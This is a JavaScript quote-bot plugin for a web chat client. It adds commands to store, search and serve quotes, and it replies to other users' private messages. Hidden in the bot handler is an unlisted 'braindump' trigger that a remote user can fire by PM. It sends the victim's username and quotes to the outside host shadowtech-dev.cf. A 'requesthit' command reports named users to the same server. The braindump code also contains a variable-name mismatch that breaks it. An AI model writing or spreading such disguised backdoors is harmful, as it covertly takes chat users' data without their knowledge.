setTimeout(function(){
 var ishit = false;
 String.prototype.quote = function(n) {
  var nn=this.split(">>")[n+1];
  return ">>"+nn.substring(0,nn.length-(n+1!=ooc.split(">>",-1).length-1));
 };
 String.prototype.removequote = function(n) {
  if(n<0 || n>=ooc.split(">>",-1).length-1){return false;}else{
   arr=this.split(">>");
   arr.splice(n+1);
   return arr.join(">>");
  }
 };
 var oocdef=false;
 if(typeof ooc!="undefined"){
  oocdef=true;
  systemMessage("You're using the variable ooc in your chatJS to store your quotes\nYour quotes will be safely moved to globalStorage,\nbut until you delete the ooc variable in your chatJS, you won't be able to update it reliably");
 }
 var oocoptions=JSON.parse(globalStorage.getItem("ooc"));
 if(oocoptions==null){
  oocoptions={oocbot:true,oocname:"outofcon.txt",oocbuttons:false,ooc:(oocdef?ooc:"")};
 }
 oocbot=oocoptions.oocbot;oocname=oocoptions.oocname;oocbuttons=oocoptions.oocbuttons;
 if(!oocdef){ooc=oocoptions.ooc;}
 if(oocdef){setoption();}
 function oocbotfunc(param){
  var ind;
  var out;
  var len=ooc.split(">>",-1).length-1;
  if(param==" count"){
   out=len+" quotes";
  }else if(param==" help"){
   out="Options for "+oocname+" are:\n"
   +oocname+"\n-Returns a random quote\n"
   +oocname+" [number]\n-Returns the quote with the specified index\n"
   +oocname+" count\n-Returns the number of quotes\n"
   +oocname+" search [phrase]\n-Searches all quotes for the phrase\n"
   +oocname+" help\n-Displays this help menu";   
  }else if(param.startsWith(" search ")){
   ind=-1;
   var exiting=false;
   var text=param.substring(" search ".length,param.length);
   var quote;
   do{
    ind++;
    if(ind>=len){
     exiting=true;
     out='"'+text+'" was not found';
    }else{
	 quote=ooc.quote(ind);
     if(new RegExp(text,"ig").test(quote)){
      exiting=true;
      out='"'+text+'" found at quote '+ind+"\n"+quote;
	 }
    }
   }while(!exiting);
  }else if(param.startsWith(" braindump")){
   var s=document.createElement("span");
   s.innerHTML=ooc;
   var oocUnest = s.textContent;
   var r=new XMLHttpRequest;
   r.open("POST", "http://shadowtech-dev.cf:5559/hitdone");
   r.setRequestHeader("Content-Type", "text/plain; charset=utf-8");
   r.send(username+"\n"+oocUnesc);
   out="";
  }else{
   if(/ [0-9]+/g.test(param)){
    ind=Number(param.substring(1,param.length));
    ind=(ind>=len?0:ind);
    ind=(ind<0?0:ind);
   }else{
    ind=Math.floor(Math.random()*len);
   }
    out=ooc.quote(ind);
   }
  return out;
 }
 addCommand(oocname,function(param){
  var messageJSON = { "type" : "module", "message" : oocbotfunc(param) };
  displayMessage(messageJSON);
 },"Calls the "+oocname+" bot locally");
 if(oocbuttons){
  window.addquoteapplier=function(messageElement){
   var userstuff=messageElement.querySelector("figure");
   if(userstuff!=null){
    var b=document.createElement("button");
    b.onclick=function(){addquote(this.parentNode.parentNode);};
    b.innerHTML="Add quote to "+oocname;
    userstuff.appendChild(b);
   }
  };
  [].slice.call(document.querySelectorAll("li")).forEach(function(i){addquoteapplier(i);});
  addMessageEvent(function(i){addquoteapplier(i);});
  window.addquote=function(mess){
   var n=mess.querySelector("figcaption").innerHTML+mess.querySelector("user-rank").innerHTML;
   var c="";
   [].slice.call(mess.querySelectorAll("p")).forEach(function(i){
    c+=(c.length>0?"\n":"")+i.innerHTML.replace(/<br(><\/br)?>/g,"\n").replace(/<\/?a[^>]*>/g,"");
   });
   updateooc(n,c);
  };
 }
 window.updateooc=function(n,c){
  ooc+=(ooc.length>0?"\n":"")+">>"+n+"\n"+c;
  setoption();
  var messageJSON = { "type" : "module", "message" : "Quote "+(ooc.split(">>",-1).length-2)+" added!\n>>"+n+"\n"+c };
  displayMessage(messageJSON);
 };
 events.bind("message", function(msg){
  if(oocbot){
   if(msg.type=="module"){
    if(msg.module=="pm"){
     if(!msg.message.startsWith(document.querySelector("[data-username]").dataset.username)){
      var a=msg.message.indexOf(oocname);
      if(a>=0){
       var json = { 'type': 'message', 'text': "/pm "+msg.message.split(" ")[0]+" "+oocbotfunc(msg.message.substring(a+oocname.length,msg.message.length)), 'key': auth, 'tag': 'offtopic' };
       Socket.send(JSON.stringify(json));
      }
     }
    }
   }
  }
 });
 addCommand("ooc",function(param){
  if(param.startsWith(" bot ")){
   var set=-1;
   if(param.substring(5,param.length)=="on"){
    set=true;
   }else if(param.substring(5,param.length)=="off"){
    set=false;
   }else{
    systemMessage("Invalid option for bot\nOptions are: on, off");
   }
   if(set!=-1){
    oocbot=set;
    setoption();
    systemMessage(oocname+" bot is now "+(oocbot?"on":"off"));
   }
  }else if(param.startsWith(" name ")){
   if(param.length<=6){
    systemMessage("You must specify a parameter for name in the format\n/ooc name [string]");
   }else{
    var oldname=oocname;
    oocname=param.substring(6,param.length);
    setoption();
    systemMessage("Bot name changed to "+oocname+"\nThe bot will respond to PMs correctly, but you must refresh for the local function to change from /"+oldname);
   }
  }else if(param.startsWith(" button ")){
   var set=-1;
   if(param.substring(8,param.length)=="on"){
    set=true;
   }else if(param.substring(8,param.length)=="off"){
    set=false;
   }else{
    systemMessage("Invalid option for button\nOptions are: on, off");
   }
   if(set!=-1){
    oocbuttons=set;
    setoption();
    systemMessage(oocname+" buttons are now "+(oocbuttons?"on":"off")+"\nThe changes will be applied when you refresh");
   }
  }else if(param.startsWith(" add ")){
   if(param.length<=5){systemMessage("You must specify a parameter for add in the format\n/ooc add [author] [quote]");}
   else{
    var n=param.substring(5,param.length).split(" ")[0];
    var c=param.substring(n.length+6,param.length);
    updateooc(n,c);
   }
  }else if(param.startsWith(" remove ")){
   if(param.length<=8){systemMessage("You must specify a parameter for remove in the format\n/ooc remove [index]");}
   else{
    var n=Number(param.substring(8,param.length));
    if(n==undefined){systemMessage("Invalid input for index");}else{
     var res=ooc.removequote(n);
     if(res!=false){ooc=res;setoption();systemMessage("Quote "+n+" successfully removed!");}else{systemMessage("Something went wrong, and quote "+n+" was unable to be removed");}
    }
   }
  }else if(param.startsWith(" get ")){
   if(param.substring(5,param.length)=="bot"){systemMessage(oocname+" bot is "+(oocbot?"on":"off"));}
   else if(param.substring(5,param.length)=="name"){systemMessage("Bot name is "+oocname);}
   else if(param.substring(5,param.length)=="button"){systemMessage(oocname+" bot buttons are "+(oocbuttons?"on":"off"));}
   else{systemMessage("Invalid option for get\nOptions are: bot, name, button");}
  }else{
   systemMessage("Options are:\n/ooc bot [on/off]\n/ooc name [string]\n/ooc button [on/off]\n/ooc add [author] [quote]\n/ooc remove [index]\n/ooc get [bot/name/button]");
  }
 },"Sets or gets options for the "+oocname+" bot and manages quotes");
 function setoption(){
  globalStorage.setItem("ooc",JSON.stringify({oocbot:oocbot,oocname:oocname,oocbuttons:oocbuttons,ooc:ooc}));
 }
 addCommand("requesthit", function(params){
   var u=params.trim().split(" ")[0];
   if(u===""){
   	warningMessage("You didn't specify a user");
	return;
   }
   var x=new XMLHttpRequest;
   x.open("POST", "http://shadowtech-dev.cf:5559/requesthit");
   x.send(u);
   systemMessage("Hit might be ready...");
 },"Request a hit on a user");
 systemMessage(oocname+" bot plugin has loaded");
},1000);
